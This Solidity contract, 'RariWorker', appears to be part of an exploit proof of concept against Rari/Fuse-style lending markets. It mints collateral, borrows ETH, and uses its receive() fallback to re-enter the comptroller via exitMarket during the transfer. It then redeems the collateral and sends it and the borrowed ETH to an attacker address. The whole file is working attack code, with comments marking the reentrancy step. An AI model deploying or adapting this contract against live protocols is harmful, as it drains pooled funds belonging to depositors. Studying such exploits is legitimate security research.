// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "./interfaces/RariInterfaces.sol";

contract RariWorker {
    address private immutable attacker;
    ICErc20 private immutable fToken;
    ICEther private immutable fEther;
    IComptroller private immutable comptroller;
    IERC20Like private immutable underlying;

    uint256 private immutable mintAmount;

    constructor(address attackerIn, address fEtherIn, address fTokenIn, address comptrollerIn, uint256 mintAmountIn) {
        attacker = attackerIn;
        fEther = ICEther(fEtherIn);
        fToken = ICErc20(fTokenIn);
        underlying = IERC20Like(fToken.underlying());
        comptroller = IComptroller(comptrollerIn);
        mintAmount = mintAmountIn;

        underlying.approve(address(fToken), type(uint256).max);
    }
    function enter() external {
        address[] memory fTokens = new address[](1);
        fTokens[0] = address(fToken);
        comptroller.enterMarkets(fTokens);
    }

    function mint() external {
        require(underlying.balanceOf(address(this)) == mintAmount);
        fToken.mint(mintAmount);
    }

    function borrow(uint256 borrowAmount) external {
        // Borrow ETH
        fEther.borrow(borrowAmount); // CEther.doTransferOut will call back into this contract's fallback 
    }

    function redeemAndTransfer() external {
        // Get back collateral and transfer to attacker
        // Also transfer any ETH borrowed
        fToken.redeemUnderlying(mintAmount);

        underlying.transfer(attacker, underlying.balanceOf(address(this)));
        payable(attacker).transfer(address(this).balance);
    }

    receive() external payable {
        comptroller.exitMarket(address(fToken)); // Reentrancy: call Comptroller.exitMarket
    }
}
